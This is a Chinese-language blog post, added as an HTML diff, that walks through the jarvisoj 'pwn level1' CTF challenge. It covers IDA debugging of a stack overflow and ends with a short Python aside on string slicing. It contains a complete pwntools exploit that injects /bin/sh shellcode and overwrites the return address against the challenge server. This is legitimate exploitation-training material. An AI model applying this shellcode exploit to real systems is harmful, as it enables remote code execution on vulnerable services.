@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>jarvisoj pwn level1 wp | closefrom</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://closefrom.github.io/favicon.ico?v=1615649066608">
+<link rel="stylesheet" href="https://closefrom.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="1.得到连接链接和文件
+2.查看文件防护机制
+
+3.IDA*32打开文件，ubuntu开启linux_server，IDA远程调试
+4.
+找到main函数，f5进入伪代码，然后跟进到 vulnerable_function 查看
+
+可以看到..." />
+    <meta name="keywords" content="pwn" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://closefrom.github.io">
+        <img src="https://closefrom.github.io/images/avatar.png?v=1615649066608" class="site-logo">
+        <h1 class="site-title">closefrom</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="https://closefrom.github.io/archives" class="site-nav">
+            文章汇总
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            文章标签分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      The deeper you explore, the more you close from the truth
+    </div>
+    <div class="site-footer">
+      <div>
+	<a href="https://www.zyglz.com"> © 资源管理站</a>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<p><span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span></p>
+	<p><span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
+</div>
+Powered by <a href="https://github.com/getgridea/gridea" target="_blank">closefrom</a> | <a class="rss" href="https://closefrom.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">jarvisoj pwn level1 wp</h2>
+            <div class="post-date">2019-05-10</div>
+            
+            <div class="post-content" v-pre>
+              <p>1.得到连接链接和文件</p>
+<p>2.查看文件防护机制<br>
+<img src="https://closefrom.github.io/post-images/1-1.png" alt="" loading="lazy"></p>
+<p>3.IDA*32打开文件，ubuntu开启linux_server，IDA远程调试</p>
+<p>4.<img src="https://closefrom.github.io/post-images/2-1.png" alt="" loading="lazy"></p>
+<p>找到main函数，f5进入伪代码，然后跟进到 vulnerable_function 查看<br>
+<img src="https://closefrom.github.io/post-images/3-1.png" alt="" loading="lazy"></p>
+<p>可以看到，有个printf %p打印buf的初始地址，以及函数列表中没有类似system之类的函数，再结合上面没有开NX保护机制，就可以知道，这一题，是要通过shellcode来getshell</p>
+<p>5.具体就是：将shellcode（pwntools提供了获取/bin/sh   shellcode，就是shellcraft.sh()）写入到buf的首地址处，中间接着是一堆字符数据（无关紧要），最后就是溢出部分，将buf的首地址，覆盖到 返回地址上，实现getshell</p>
+<p>6.一开始，先不下断，直接运行，看一下，buf的初始地址<br>
+<img src="https://closefrom.github.io/post-images/4-1.png" alt="" loading="lazy"></p>
+<ol start="7">
+<li></li>
+</ol>
+<figure data-type="image" tabindex="1"><img src="https://closefrom.github.io/post-images/5-1-1024x537.png" alt="" loading="lazy"></figure>
+<p>在call vulnerable_function处下断，f9运行到此，然后f7单步步入<br>
+<img src="https://closefrom.github.io/post-images/6-1-1024x364.png" alt="" loading="lazy"></p>
+<p>可见进入vulnerable_function后，保存完caller的下一指令地址后，以及main函数的栈低地址之后，就开始了vulnerable_function栈帧，先腾出0x88+0x8空间，0x88空间存放buf字符串，EAX寄存器存放着buf的初始地址FF936720，然后将printf必要参数入栈，调用printf函数<br>
+<img src="https://closefrom.github.io/post-images/7-1.png" alt="" loading="lazy"></p>
+<p>可以看到输出了buf的初始地址。这样根据上面思路，可以通过read，进行栈溢出，覆盖返回地址，来实现getshell</p>
+<ol start="8">
+<li></li>
+</ol>
+<figure data-type="image" tabindex="2"><img src="https://closefrom.github.io/post-images/8-1.png" alt="" loading="lazy"></figure>
+<p>9.编写exp</p>
+<pre class="wp-block-code"><code>from pwn import *
+
+link = remote("pwn2.jarvisoj.com","9877")
+#连接目标主机
+context(arch = 'i386', os = 'linux',log_level = 'debug')
+#设置目标主机的信息
+shellcode = asm(shellcraft.sh())
+#asm()函数接收一个字符串作为参数，得到汇编码的机器代码  
+#shellcraft.sh()是执行/bin/sh的shellcode
+trash = 'A'*(0x88 + 0x4 - len(shellcode))
+#构造 无意义数据，覆盖main的ebp，和 main的ebp和shellcode之间的数据
+txt = link.recvline()[14:-2]
+#recvline() 接收一行输出
+#至于后面的[number:number]则是对字符串截断
+#是截取从第14位开始，到倒数第2位之前结束（也就是到倒数第三位）
+buf_address = int(txt,16)
+#int(a,b) 将 为b进制的字符串a，转为整型
+payload = shellcode + trash + p32(buf_address)
+#然后构建payload
+link.sendline(payload)
+#发送payload，并进行换行
+link.interactive()
+#将控制权交给用户</code></pre>
+<ol>
+<li>运行脚本，getshell，cat flag<br>
+<img src="https://closefrom.github.io/post-images/9-1.png" alt="" loading="lazy"></li>
+</ol>
+<p>扩展{</p>
+<p>python 字符串截断</p>
+<pre class="wp-block-code"><code>str = ‘0123456789’
+print str[0:3] #截取第一位到第三位的字符
+print str[:] #截取字符串的全部字符
+print str[6:] #截取第七个字符到结尾
+print str[:-3] #截取从头开始到倒数第三个字符之前
+print str[2] #截取第三个字符
+print str[-1] #截取倒数第一个字符
+print str[::-1] #创造一个与原字符串顺序相反的字符串
+print str[-3:-1] #截取倒数第三位与倒数第一位之前的字符
+print str[-3:] #截取倒数第三位到结尾
+</code></pre>
+<p>对应的输出结果：</p>
+<pre class="wp-block-code"><code>012
+0123456789
+6789
+0123456
+2
+9
+9876543210
+78
+789</code></pre>
+<p>字符串截取，跟C语言一样，包头不包尾</p>
+<p>}</p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://closefrom.github.io/tag/mQz58myZ-/" class="tag">
+                    pwn
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://closefrom.github.io/post/jarvisoj-pwn-level0-wp/">
+                  <h3 class="post-title">
+                    jarvisoj pwn level0 wp
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
